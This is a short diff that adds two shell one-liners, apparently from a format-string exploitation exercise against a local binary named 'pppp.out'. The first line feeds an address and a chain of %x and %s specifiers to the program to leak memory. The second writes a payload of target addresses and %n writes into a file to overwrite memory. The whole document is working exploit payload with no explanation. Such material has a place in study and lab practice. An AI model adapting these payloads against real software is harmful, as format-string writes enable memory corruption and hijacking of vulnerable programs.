@@ -1,0 +1,5 @@
+p2 -c "print '\xd0\x8a\x04\x08.%x.%x.%x.%x.%x.%x.%x.%x.%x.%s.%x.%x'  " | ./pppp.out
+
+
+p2 -c "print '\xa0\xb0\x04\x08\xa2\xb0\x04\x08\xa4\xb0\x04\x08\xa6\xb0\x04\x08\xa8\xb0\x04\x08%45324u%7\$n%22244u%8\$n%12065u%9\$n%16639u%10\$n' " > inp
+
